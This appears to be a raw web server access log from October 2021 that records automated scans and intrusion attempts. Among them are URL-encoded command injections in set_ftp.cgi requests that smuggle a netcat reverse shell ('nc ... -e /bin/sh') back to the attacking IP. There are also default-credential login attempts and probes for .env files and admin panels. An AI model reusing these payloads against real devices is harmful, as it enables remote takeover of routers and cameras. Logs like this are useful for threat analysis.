199.195.248.54 - - [23/Oct/2021:22:41:13 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:22:41:14 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+199.195.248.54+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:22:41:14 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [23/Oct/2021:22:56:56 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [23/Oct/2021:22:56:57 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.48.211+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [23/Oct/2021:22:56:57 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
209.141.62.185 - - [23/Oct/2021:22:57:58 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.32.221 - - [23/Oct/2021:23:05:37 +0800] "GET / HTTP/1.1" 403 159 "-" "Linux Gnu (cow)"
5.45.72.44 - - [23/Oct/2021:23:24:59 +0800] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 163 "-" "-"
5.45.72.44 - - [23/Oct/2021:23:25:03 +0800] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 163 "-" "-"
195.154.63.222 - - [23/Oct/2021:23:35:23 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
115.59.237.196 - - [23/Oct/2021:23:45:09 +0800] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 159 "-" "-"
34.101.222.0 - - [23/Oct/2021:23:51:38 +0800] "GET /.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.101.222.0 - - [23/Oct/2021:23:51:40 +0800] "POST / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.42.209 - - [23/Oct/2021:23:54:04 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.51.171 - - [24/Oct/2021:00:06:11 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 159 "http://8.129.89.34:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.51.171 - - [24/Oct/2021:00:06:11 +0800] "" 400 0 "-" "-"
60.191.125.35 - - [24/Oct/2021:00:26:24 +0800] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
205.185.120.103 - - [24/Oct/2021:00:33:00 +0800] "GET / HTTP/1.1" 200 23 "-" "Linux Gnu (cow)"
94.232.41.215 - - [24/Oct/2021:01:06:37 +0800] "\x03\x00\x00*%\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Test" 400 163 "-" "-"
94.232.41.215 - - [24/Oct/2021:01:06:41 +0800] "\x03\x00\x00*%\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Test" 400 163 "-" "-"
80.82.78.39 - - [24/Oct/2021:01:41:51 +0800] "GET /about.php HTTP/1.1" 404 159 "-" "Mozilla/5.0"
80.82.78.39 - - [24/Oct/2021:01:42:09 +0800] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x94\xDD\xB2\xD1\x07\x11u\x1F\x86\x81\xF2\xBE\x18\x5Cx\xF0Zc\xE3;\xA3C>\x17\x0C\x91\xD0\xA4\xED\x92\x98~ Rm\xAEfg\x87\xB0\x86\xFF\x01\x97\x84\x99(\xD7+%O\xBF\x08\x7F\xE7\xEEt+" 400 163 "-" "-"
167.94.138.60 - - [24/Oct/2021:02:07:52 +0800] "GET / HTTP/1.1" 200 23 "-" "-"
167.94.138.60 - - [24/Oct/2021:02:07:54 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
101.132.47.159 - - [24/Oct/2021:02:23:41 +0800] "GET / HTTP/1.1" 403 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.47.159 - - [24/Oct/2021:02:23:41 +0800] "GET /explicit_not_exist_path HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.47.159 - - [24/Oct/2021:02:23:42 +0800] "GET /admin/ HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.47.159 - - [24/Oct/2021:02:23:42 +0800] "GET /robots.txt HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.47.159 - - [24/Oct/2021:02:23:42 +0800] "GET /favicon.ico HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.47.159 - - [24/Oct/2021:02:23:42 +0800] "GET /login/img/product_logo.png HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.47.159 - - [24/Oct/2021:02:23:42 +0800] "GET /images/ofbiz.ico HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.47.159 - - [24/Oct/2021:02:23:42 +0800] "GET /phpMyAdmin/ HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.47.159 - - [24/Oct/2021:02:23:42 +0800] "GET /phpmyadmin/ HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.47.159 - - [24/Oct/2021:02:23:42 +0800] "GET /wcm/ HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
209.141.56.212 - - [24/Oct/2021:02:25:07 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.46.89 - - [24/Oct/2021:02:50:13 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
